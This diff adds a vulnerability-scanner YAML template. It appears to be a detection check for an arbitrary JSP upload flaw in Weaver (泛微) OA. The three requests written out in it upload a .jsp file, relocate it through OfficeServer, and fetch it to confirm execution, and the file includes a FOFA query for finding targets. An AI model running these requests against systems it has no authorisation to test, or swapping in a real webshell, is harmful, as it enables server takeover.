@@ -1,0 +1,58 @@
+id: poc-yaml-weaver-oa-uploaderoperate-jsp-anyfile-upload
+info:
+  name: 泛微OA uploaderOperate.jsp 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: weaver
+  fofa: app="泛微-协同办公OA"
+variables:
+  filename: to_lower(random_str(5))
+  string: random_str(4)
+requests:
+- method: POST
+  path: /workrelate/plan/util/uploaderOperate.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+  data: '------WebKitFormBoundaryVdb2RRl25PuaGhWj
+
+    Content-Disposition: form-data; name="secId"
+
+
+    1
+
+    ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+
+    Content-Disposition: form-data; name="Filedata"; filename="{{.filename}}.jsp"
+
+
+    <%out.println("{{.string}}");%>
+
+    ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+
+    Content-Disposition: form-data; name="plandetailid"
+
+
+    1
+
+    ------WebKitFormBoundaryVdb2RRl25PuaGhWj--'
+  expression: status_code == 200 && contains(body,"workrelate/plan/util/ViewDoc")
+  output:
+  - regex_match(body,"fileid=(?P<Fileid>[0-9]+)")
+- method: POST
+  path: /OfficeServer
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+  data: '------WebKitFormBoundaryVdb2RRl25PuaGhWj
+
+    Content-Disposition: form-data; name="aaa"
+
+
+    {"OPTION":"INSERTIMAGE","isInsertImageNew":"1","imagefileid4pic":"{{.Fileid}}"}
+
+    ------WebKitFormBoundaryVdb2RRl25PuaGhWj--'
+  expression: status_code == 200 && contains(body,"println")
+- method: GET
+  path: /{{.filename}}.jsp
+  expression: status_code == 200 && contains(body,string)
+transport: http
